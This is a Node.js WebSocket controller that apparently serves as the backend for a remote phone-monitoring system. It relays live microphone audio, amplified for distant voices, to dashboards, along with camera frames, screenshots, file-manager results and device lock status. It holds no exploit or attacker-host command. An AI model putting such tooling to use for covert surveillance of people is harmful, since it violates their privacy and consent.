/**
 * Device WebSocket controller (/audio/<deviceId>)
 */

const WebSocket = require("ws");
const { parseReqUrl } = require("../utils/url");
const { normalizeDeviceId } = require("../utils/device");
const deviceStore = require("../models/deviceStore");
const dashboardStore = require("../models/dashboardStore");
const { broadcastToDashboard, broadcastToDeviceSubscribers } = require("../services/dashboardService");
const { parseAudioPayload, buildAmplifiedPayload } = require("../utils/audio");
const { saveUploadedPhoto } = require("../services/photoService");

const { DASHBOARD_MAX_BUFFERED_BYTES } = require("../config");

function handleAudioDevice(ws, req) {
  const { pathname } = parseReqUrl(req.url || "");
  const parts = pathname.split("/");
  const rawDeviceId = parts[2] || "unknown_" + Date.now();
  const deviceId = normalizeDeviceId(decodeURIComponent(rawDeviceId));

  console.log(`📱 Device connected: "${deviceId}" (raw: "${rawDeviceId}")`);
  console.log(
    `📋 Current devices before: [${Array.from(deviceStore.devices.keys())
      .map((k) => `"${k}"`)
      .join(", ")}]`,
  );

  const existing = deviceStore.getDevice(deviceId);
  if (existing && existing.ws && existing.ws !== ws) {
    console.log(`♻️ Replacing existing socket for ${deviceId}`);
    try {
      existing.ws.terminate();
    } catch (_) {}
  }

  const deviceData = {
    ws,
    model: "Unknown",
    sdk: 0,
    appVersionName: "",
    appVersionCode: 0,
    connectedAt: new Date(),
    recordingSampleRate: 16000,
    health: {
      wsConnected: true,
      micCapturing: false,
      lastAudioChunkAt: Date.now(),
      lastHealthAt: Date.now(),
      reason: "connected",
      internetOnline: true,
      callActive: false,
      isWebRtcStreaming: false,
      batteryPct: null,
      charging: null,
      networkLocked: false,
      appLocked: false,
      gainLevel: 1.0,
    },
  };

  // Mark device sockets so the generic WS heartbeat does not kill active audio streams.
  ws._isAudioDevice = true;

  deviceStore.addDevice(deviceId, deviceData);

  broadcastToDashboard({
    type: "device_connected",
    deviceId,
    model: "Unknown",
    health: deviceStore.getDevice(deviceId)?.health,
  });

  ws.on("message", (data) => {
    const current = deviceStore.getDevice(deviceId);
    if (!current || current.ws !== ws) {
      return;
    }

    const isText =
      typeof data === "string" ||
      (data instanceof Buffer &&
        (data.slice(0, 12).toString().startsWith("DEVICE_INFO:") ||
          data.slice(0, 4).toString().startsWith("ACK:") ||
          data.slice(0, 5).toString().startsWith("FILE:") ||
          data.slice(0, 5).toString().startsWith("pong:") ||
          data.slice(0, 1).toString() === "{"));

    if (isText) {
      const text = data.toString().trim();

      if (text.startsWith("DEVICE_INFO:")) {
        const infoParts = text.split(":");
        const model = infoParts[2];
        const sdk = infoParts[3];
        const appVersionName = infoParts[4] || "";
        const appVersionCode = Number(infoParts[5] || 0) || 0;
        const dev = deviceStore.getDevice(deviceId);
        if (dev) {
          dev.model = model;
          dev.sdk = parseInt(sdk, 10) || 0;
          if (appVersionName) dev.appVersionName = appVersionName;
          if (appVersionCode > 0) dev.appVersionCode = appVersionCode;
        }
        console.log(`ℹ️ [Device] ${deviceId} identified: ${model} (SDK ${sdk}, v${appVersionName})`);
        broadcastToDashboard({
          type: "device_info",
          deviceId,
          model,
          sdk,
          appVersionName,
          appVersionCode,
        });
      } else if (text.startsWith("ACK:")) {
        console.log(`✅ ACK from ${deviceId}: ${text}`);
        broadcastToDashboard({ type: "ack", deviceId, message: text });
      } else if (text.startsWith("FILE:")) {
        const filename = text.replace("FILE:", "");
        console.log(`💾 ${deviceId} saved recording: ${filename}`);
        broadcastToDashboard({ type: "recording_saved", deviceId, filename });
      } else if (text === `pong:${deviceId}`) {
        // heartbeat pong — ignore
      } else if (text.startsWith("{")) {
        try {
          const json = JSON.parse(text);
          if (json.type === "device_data") {
            console.log(`📊 device_data from ${deviceId}`);
            broadcastToDashboard({
              type: "device_data",
              deviceId,
              data: json.data,
            });
          } else if (json.type === "health_status") {
            const dev = deviceStore.getDevice(deviceId);
            if (dev) {
              dev.health = {
                wsConnected: json.wsConnected !== false,
                micCapturing: json.micCapturing === true,
                isWebRtcStreaming: json.isWebRtcStreaming === true,
                lastAudioChunkAt: Number(
                  json.lastAudioChunkSentAt || dev.health?.lastAudioChunkAt || 0,
                ),
                lastHealthAt: Number(json.ts || Date.now()),
                reason: String(json.reason || "heartbeat"),
                aiMode: json.aiMode !== false,
                aiAuto: json.aiAuto !== false,
                streamCodec: String(json.streamCodec || dev.health?.streamCodec || "pcm"),
                streamCodecMode: String(
                  json.streamCodecMode || dev.health?.streamCodecMode || "auto",
                ),
                voiceProfile: String(json.voiceProfile || dev.health?.voiceProfile || "room"),
                noiseDb: Number.isFinite(Number(json.noiseDb))
                  ? Number(json.noiseDb)
                  : null,
                internetOnline: json.internetOnline !== false,
                callActive: json.callActive === true,
                batteryPct: Number.isFinite(Number(json.batteryPct))
                  ? Number(json.batteryPct)
                  : null,
                charging: typeof json.charging === "boolean" ? json.charging : null,
                lowNetwork: json.lowNetwork === true,
                photoAi: json.photoAi !== false,
                photoQuality: String(json.photoQuality || dev.health?.photoQuality || "normal"),
                photoNight: String(json.photoNight || dev.health?.photoNight || "off"),
                appVersionName: String(json.appVersionName || dev.health?.appVersionName || ""),
                appVersionCode: Number.isFinite(Number(json.appVersionCode))
                  ? Number(json.appVersionCode)
                  : Number(dev.health?.appVersionCode || 0),
                netDownKbps: Number(json.netDownKbps || 0),
                netUpKbps: Number(json.netUpKbps || 0),
                netType: String(json.netType || "other"),
                bitrateKbps: Number(json.bitrateKbps || 0),
                networkLocked: json.networkLocked === true,
                appLocked: json.appLocked === true,
                gainLevel: Number.isFinite(Number(json.gainLevel)) ? Number(json.gainLevel) : 1.0,
              };
              
              console.log(`📊 [Health] ${deviceId}: ${json.reason || "periodic"} (WS=${json.wsConnected}, Mic=${json.micCapturing}, Bat=${json.batteryPct}%)`);
            }
            broadcastToDeviceSubscribers(deviceId, {
              type: "device_health",
              deviceId,
              health: dev?.health || null,
            });
          } else if (
            json.type === "webrtc_answer" ||
            json.type === "webrtc_ice" ||
            json.type === "webrtc_state"
          ) {
            // S-M4 fix: Update health.isWebRtcStreaming from webrtc_state messages
            if (json.type === "webrtc_state") {
              const dev = deviceStore.getDevice(deviceId);
              if (dev && dev.health) {
                if (json.state.startsWith("started_") || json.state.startsWith("ice_") || json.state.startsWith("pc_")) {
                  if (json.state === "ice_disconnected" || json.state === "ice_failed" || json.state === "ice_timeout" || json.state === "ice_closed" ||
                      json.state === "pc_disconnected" || json.state === "pc_failed" || json.state === "pc_closed") {
                    dev.health.isWebRtcStreaming = false;
                  } else {
                    dev.health.isWebRtcStreaming = true;
                  }
                } else if (json.state === "stopped" || json.state.startsWith("aborted_") || json.state.endsWith("_fail")) {
                  dev.health.isWebRtcStreaming = false;
                }
              }
            }
            broadcastToDeviceSubscribers(deviceId, { ...json, deviceId });
          } else if (json.type === "photo_upload" || json.type === "screenshot_upload") {
            const saved = saveUploadedPhoto(deviceId, json);
            if (saved) {
              broadcastToDashboard({
                type: "photo_saved",
                deviceId,
                filename: saved.filename,
                url: `/photos/${saved.filename}`,
                size: saved.size,
                camera: saved.camera,
                quality: saved.quality,
                aiEnhanced: saved.aiEnhanced,
                ts: saved.ts,
              });
            }
          } else if (json.type === "camera_live_frame") {
            broadcastToDeviceSubscribers(deviceId, {
              type: "camera_live_frame",
              deviceId,
              camera: String(json.camera || "rear").toLowerCase(),
              quality: String(json.quality || "normal").toLowerCase(),
              mime: String(json.mime || "image/jpeg"),
              data: String(json.data || ""),
              ts: Number(json.ts || Date.now()),
            });
            // Don't log frames to avoid stdout flood, but keep track
          } else if (json.type === "file_manager_result") {
            // Forward file manager results to dashboard subscribers
            console.log(`📁 [FileManager] ${deviceId}: ${json.action} → ${json.status}`);
            broadcastToDeviceSubscribers(deviceId, {
              type: "file_manager_result",
              deviceId,
              action: String(json.action || ""),
              status: String(json.status || "error"),
              error: json.error || undefined,
              path: json.path || undefined,
              parentPath: json.parentPath || undefined,
              items: json.items || undefined,
              count: json.count || undefined,
              data: json.data || undefined,
              name: json.name || undefined,
              size: json.size || undefined,
              mime: json.mime || undefined,
              oldPath: json.oldPath || undefined,
              newPath: json.newPath || undefined,
              transferId: json.transferId || undefined,
              chunkIndex: json.chunkIndex,
              totalChunks: json.totalChunks,
              bytesWritten: json.bytesWritten,
              totalSize: json.totalSize,
              ts: Date.now(),
            });
          } else if (json.type === "command_ack") {
            console.log(`✅ [ACK] ${deviceId} command result: ${json.command} = ${json.status} (${json.detail || "no detail"})`);
            broadcastToDeviceSubscribers(deviceId, {
              type: "command_ack",
              deviceId,
              command: String(json.command || ""),
              status: String(json.status || "success"),
              detail: String(json.detail || ""),
              ts: Number(json.ts || Date.now()),
            });
          } else if (json.type === "update_status" || json.type === "update_available") {
            console.log(`🔄 Update status from ${deviceId}: ${json.status || json.version || "?"}`);
            broadcastToDeviceSubscribers(deviceId, { ...json, deviceId });
          } else if (json.type === "error") {
            console.error(`⚠️  Error from ${deviceId}: ${json.message}`);
            broadcastToDeviceSubscribers(deviceId, {
              type: "error",
              message: `[${deviceId.substring(0, 8)}] ${json.message}`,
            });
          } else {
            console.log(`📨 ${deviceId}: ${text}`);
          }
        } catch (_) {
          console.log(`📨 ${deviceId}: ${text}`);
        }
      } else {
        console.log(`📨 ${deviceId}: ${text}`);
      }
      return;
    }

    const dev = deviceStore.getDevice(deviceId);
    const buf = Buffer.from(data);

    // BUG E: Log the first 4 bytes of every received binary frame
    if (buf.length >= 4) {
      console.log(`[Binary Frame] First 4 bytes: ${buf.slice(0, 4).toString('hex')}`);
    }

    // ── Binary Camera Live Frame Routing ────────────────────────────────────
    if (buf.length >= 4 && buf[0] === 0x43 && buf[1] === 0x4C) { // 'C', 'L'
      const headerLen = (buf[2] << 8) | buf[3];
      if (headerLen > 0 && buf.length >= 4 + headerLen) {
        const headerJson = buf.subarray(4, 4 + headerLen).toString("utf8");
        const jpegBytes = buf.subarray(4 + headerLen);
        try {
          const header = JSON.parse(headerJson);
          if ((header?.type === "photo_upload" || header?.type === "screenshot_upload") && jpegBytes.length > 0) {
            const saved = saveUploadedPhoto(deviceId, {
              ...header,
              data: jpegBytes.toString("base64"),
            });
            if (saved) {
              broadcastToDashboard({
                type: "photo_saved",
                deviceId,
                filename: saved.filename,
                url: `/photos/${saved.filename}`,
                size: saved.size,
                camera: saved.camera,
                quality: saved.quality,
                aiEnhanced: saved.aiEnhanced,
                ts: saved.ts,
              });
            }
            return;
          }
        } catch (_e) {}
      }
      let hasCameraSubscribers = false;
      dashboardStore.forEachClientSubscribedToDevice(deviceId, () => {
        hasCameraSubscribers = true;
      });
      if (!hasCameraSubscribers) return;
      dashboardStore.forEachClientSubscribedToDevice(deviceId, (client) => {
        if (client.readyState !== WebSocket.OPEN) return;
        if (client.bufferedAmount > DASHBOARD_MAX_BUFFERED_BYTES) return;
        client.send(buf);
      });
      return; // Skip audio processing
    }

    const wantsToRecord = false; // Recording feature removed
    let hasDashboardSubscribers = false;
    dashboardStore.forEachClientSubscribedToDevice(deviceId, () => {
      hasDashboardSubscribers = true;
    });

    if (dev?.health) {
      dev.health.lastAudioChunkAt = Date.now();
      dev.health.micCapturing = true;
      dev.health.wsConnected = true;
    }

    // If nobody is listening AND we are not recording, skip audio processing/routing.
    if (!hasDashboardSubscribers && !wantsToRecord) {
      return;
    }

    const serverGain = 2.5;
    const needsDecodedAudio = true;  // Always decode+amplify for far-voice clarity
    let parsedAudio = null;
    let forwardedPayload = buf;

    if (needsDecodedAudio) {
      try {
        parsedAudio = parseAudioPayload(buf);
      } catch (e) {
        console.error(`⚠️  Failed to parse audio from ${deviceId}:`, e.message);
        return;
      }
    }

    const now = Date.now();
    if (!dev._lastAudioLogAt || now - dev._lastAudioLogAt > 5000) {
      dev._lastAudioLogAt = now;
      console.log(
        `🎵 [Audio] from ${deviceId}: ${data.length} bytes${parsedAudio ? `, HQ=${parsedAudio.isHqMode}` : ""}`,
      );
    }
    // S-M2 fix: Throttle device_info/health broadcasts to every 30s (was 5s)
    if (!dev._lastInfoBroadcastAt || now - dev._lastInfoBroadcastAt > 30_000) {
      dev._lastInfoBroadcastAt = now;
      broadcastToDeviceSubscribers(deviceId, {
        type: "device_info",
        deviceId,
        model: dev.model || "Unknown",
        sdk: dev.sdk || 0,
        appVersionName: dev.appVersionName || "",
        appVersionCode: dev.appVersionCode || 0,
      });
      broadcastToDeviceSubscribers(deviceId, {
        type: "device_health",
        deviceId,
        health: dev.health || null,
      });
    }

    // S-H1 Fix: Default server gain remains 1.0 (no-op). Avoid decode/re-encode when no gain is needed.
    if (parsedAudio) {
      forwardedPayload = buildAmplifiedPayload(
        parsedAudio.forwardPayload,
        parsedAudio.pcm16,
        serverGain,
        true, // has 4-byte audio header
      );
    }

    const idBuf = Buffer.from(deviceId, "utf8");
    const header = Buffer.alloc(2);
    header.writeUInt16BE(idBuf.length, 0);
    const audioFrame = Buffer.concat([header, idBuf, forwardedPayload]);
    // Route audio only to dashboard clients that actively subscribed to this deviceId.
    dashboardStore.forEachClientSubscribedToDevice(deviceId, (client) => {
      if (client.readyState !== WebSocket.OPEN) return;
      const buffered = client.bufferedAmount || 0;
      const now = Date.now();
      const hardDropThreshold = DASHBOARD_MAX_BUFFERED_BYTES * 2;
      if (buffered > DASHBOARD_MAX_BUFFERED_BYTES) {
        client._audioBackoffLevel = Math.min((client._audioBackoffLevel || 0) + 1, 6);
        const backoffMs = Math.min(250 * (2 ** client._audioBackoffLevel), 5000);
        client._audioBackoffUntil = now + backoffMs;
        client._droppedFrames = (client._droppedFrames || 0) + 1;
        if (!client._lastDropNotifyAt || now - client._lastDropNotifyAt > 5_000) {
          client._lastDropNotifyAt = now;
          try {
            client.send(
              JSON.stringify({
                type: "audio_quality",
                deviceId,
                droppedFrames: client._droppedFrames,
                buffered: client.bufferedAmount,
                ts: now,
              }),
            );
            client._droppedFrames = 0;
          } catch (_e) {}
        }
        if (buffered > hardDropThreshold) {
          return;
        }
      }

      if ((client._audioBackoffUntil || 0) > now) {
        const stride = Math.max(2, 2 ** Math.max((client._audioBackoffLevel || 1) - 1, 0));
        client._audioBackoffCounter = (client._audioBackoffCounter || 0) + 1;
        if (client._audioBackoffCounter % stride !== 0) {
          return;
        }
      } else if ((client._audioBackoffLevel || 0) > 0) {
        client._audioBackoffLevel = Math.max(0, client._audioBackoffLevel - 1);
      }

      client.send(audioFrame);
    });


  });

  ws.on("close", () => {
    const current = deviceStore.getDevice(deviceId);
    if (!current || current.ws !== ws) {
      console.log(`↪️ Ignoring stale close for "${deviceId}"`);
      return;
    }

    console.log(`❌ Device disconnected: "${deviceId}"`);
    console.log(
      `📋 Devices before removal: [${Array.from(deviceStore.devices.keys())
        .map((k) => `"${k}"`)
        .join(", ")}]`,
    );

    deviceStore.removeDevice(deviceId);

    console.log(
      `📋 Devices after removal: [${Array.from(deviceStore.devices.keys())
        .map((k) => `"${k}"`)
        .join(", ")}]`,
    );
    broadcastToDashboard({ type: "device_disconnected", deviceId });
  });

  ws.on("error", (err) => {
    console.error(`⚠️  Error from ${deviceId}:`, err.message);
  });
}

module.exports = {
  handleAudioDevice,
};
